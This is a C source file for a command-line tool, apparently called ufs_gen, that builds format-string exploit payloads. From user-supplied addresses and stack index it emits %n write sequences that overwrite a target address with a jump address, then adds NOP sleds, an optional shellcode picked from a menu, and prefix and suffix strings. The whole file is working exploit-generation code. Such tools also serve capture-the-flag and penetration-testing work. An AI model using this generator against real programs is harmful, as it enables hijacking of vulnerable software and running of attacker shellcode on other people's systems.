/*
 * Copyright (C) 2014 Olivier Gayot
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <assert.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <stdio.h>
#include <getopt.h>

#include "shellcodes.h"

static unsigned char payload[4096];

/* address to override */
static unsigned long override_addr_g;

/* address to jump to */
static unsigned long jmp_addr_g;

/* index of the element on the stack which is the beginning of the payload */
static unsigned int idx_stack_g;

/* assume that an address is 'address_size_g' bytes long */
static int address_size_g = 4;

/* prepend the payload with a prefix */
static char *prefix_g = NULL;

/* append suffix to the payload */
static char *suffix_g = NULL;

/* how many NOP bytes (0x90) shall we append before suffix */
static int suffix_nops_g = 0;

/* shall we display a menu with the possible shellcodes ? */
static bool select_shellcode_g = false;

static char *shellcode_g = NULL;

    __attribute__((noreturn))
static void usage(const char *arg0)
{
    (void)arg0;

    fputs("usage:\n\n", stderr);
    fputs(
            "ufs_gen "
            "[--prefix pfx] [--suffix sfx] [--sfxnops n]\n"
            "        --override addr --with addr --stackidx idx\n"
            "        --shellcode\n"
            , stderr);

    exit(EX_USAGE);
}

/*
 * this function uses getopt to parse the options.
 * it returns 0 on success; otherwise it returns a negative number
 */
static int parse_arguments(int argc, char *argv[])
{
    bool override_set = false;
    bool stackidx_set = false;
    bool with_set = false;

    for (;;) {
        /* declaration of the options which we handle */
        enum {
            OPT_OVERRIDE,
            OPT_WITH,
            OPT_STACKIDX,
            OPT_ADDR_SIZE,
            OPT_PREFIX,
            OPT_SUFFIX,
            OPT_SFX_NOPS,
            OPT_SHELLCODE,
        };

        static struct option long_options[] = {
            {"override",  required_argument, 0, OPT_OVERRIDE},
            {"with",      required_argument, 0, OPT_WITH},
            {"stackidx",  required_argument, 0, OPT_STACKIDX},
            {"addrsize",  required_argument, 0, OPT_ADDR_SIZE},
            {"prefix",    required_argument, 0, OPT_PREFIX},
            {"suffix",    required_argument, 0, OPT_SUFFIX},
            {"sfxnops",   required_argument, 0, OPT_SFX_NOPS},
            {"shellcode", no_argument,       0, OPT_SHELLCODE},
        };

        int option_index;
        int c = getopt_long(argc, argv, "", long_options, &option_index);

        if (c == -1) {
            break;
        }

        switch (c) {
            case OPT_OVERRIDE:
                override_addr_g = strtoul(optarg, NULL, 16);
                override_set = true;
                break;
            case OPT_WITH:
                jmp_addr_g = strtoul(optarg, NULL, 16);
                with_set = true;
                break;
            case OPT_STACKIDX:
                idx_stack_g = atoi(optarg);
                stackidx_set = true;
                break;
            case OPT_ADDR_SIZE:
                address_size_g = atoi(optarg);

                if (address_size_g < 1 || address_size_g > 8) {
                    return -1;
                }

                break;
            case OPT_PREFIX:
                prefix_g = optarg;
                break;
            case OPT_SUFFIX:
                suffix_g = optarg;
                break;
            case OPT_SFX_NOPS:
                suffix_nops_g = atoi(optarg);
                break;
            case OPT_SHELLCODE:
                select_shellcode_g = true;
                break;
            default:
                /*
                 * we must have accessed an option which we do not have
                 * specified in our switch-case
                 */

                assert (false);

                break;
        }
    }

    if (optind < argc) {
        return -1;
    }

    if (!override_set || !stackidx_set || !with_set) {
        return -1;
    }

    return 0;
}

/*
 * this function returns the number of remaining bytes to write in order to
 * have a %n printing the expected value
 */
static int calc_remaining(unsigned int needed, unsigned int *so_far)
{
    int ret;

    assert(needed <= 0xff);

    if (needed >= (*so_far % 0x100)) {
        ret = needed - (*so_far % 0x100);
    } else {
        ret = 0x100 - ((*so_far % 0x100) - needed);
    }

    *so_far += ret;

    return ret;
}

int main(int argc, char *argv[])
{
#define PUT_ADDR(_offset) \
    do { \
        typeof(override_addr_g) override_addr = override_addr_g + _offset * 0x10; \
        \
        for (int sh = 0; sh < address_size_g; ++sh) { \
            for (int shift = 0; shift < address_size_g; ++shift) { \
                payload[i++] = (override_addr >> (shift * 8)) & 0xff; \
                ++written; \
            } \
            ++override_addr; \
        } \
    } while (0);

    unsigned int i = 0;
    unsigned int written = 0;
    unsigned int values_pop = 0;

    if (parse_arguments(argc, argv) < 0) {
        usage(argv[0]);
    }

    if (select_shellcode_g) {
        for (;;) {
            char buffer[256];
            int sel;

            /* display the name of the common shellcodes */
            for (int _i = 0; _i < SHELLCODE_COUNT; ++_i) {
                fprintf(stderr, "%02d - %s\n", _i + 1, common_shellcodes_g[_i].name);
            }
            fputs("select a shellcode. CTRL-D for no shellcode: ", stderr);

            if (fgets(buffer, sizeof(buffer), stdin) == NULL)
                break;

            /* check if the selection is valid */
            sel = atoi(buffer);
            if (sel <= 0 || sel > SHELLCODE_COUNT)
                continue;

            shellcode_g = common_shellcodes_g[sel - 1].payload;
            break;
        }
    }

    if (prefix_g != NULL) {
        int len_pfx = strlen(prefix_g);
        int mod_len_pfx = len_pfx % address_size_g;

        int len_padding = (mod_len_pfx == 0) ? 0 : address_size_g - mod_len_pfx;

        memcpy(payload + i, prefix_g, len_pfx);
        i += len_pfx;

        memcpy(payload + i, "\x90\x90\x90\x90\x90\x90\x90", len_padding);
        i += len_padding;

        /* TODO compute wisely these two values */
        written += len_pfx + len_padding;

        idx_stack_g += ((len_pfx + len_padding) / address_size_g);
    }

    PUT_ADDR(0);

    /* override the address */
    for (int shift = 0; shift < address_size_g; ++shift) {
        int remaining;

        if ((remaining = calc_remaining((jmp_addr_g >> (shift * 8)) & 0xff, &written)) < 8) {
            memcpy(payload + i, "ffffffff", remaining);
            i += remaining;
        } else {
            i += sprintf((char *)payload + i, "%%%dx", remaining);
            ++values_pop;
        }

        if (values_pop == idx_stack_g) {
            /* (very) unlikely */

            i += sprintf((char *)payload + i, "%%n");
            ++values_pop;
        } else {
            i += sprintf((char *)payload + i, "%%%d$n", idx_stack_g);
        }

        ++idx_stack_g;
    }

    /* append the NOP bytes */
    if (suffix_nops_g > 0) {
        fprintf(stderr, "NOP bytes are at offset %d (%#x)\n", i, i);
    }
    for (int nop = 0; nop < suffix_nops_g; ++nop) {
        payload[i++] = '\x90';
    }

    /* append the shellcode */
    if (shellcode_g != NULL) {
        fprintf(stderr, "shellcode is at offset %d (%#x)\n", i, i);
        int len_shellcode = strlen(shellcode_g);

        memcpy(payload + i, shellcode_g, len_shellcode);
        i += len_shellcode;
    }

    if (suffix_g != NULL) {
        fprintf(stderr, "suffix is at offset %d (%#x)\n", i, i);
        int len_suffix = strlen(suffix_g);

        memcpy(payload + i, suffix_g, len_suffix);
        i += len_suffix;
    }

    /* we write our payload */
    fwrite(payload, 1, i, stdout);

    return 0;

#undef PUT_ADDR
}
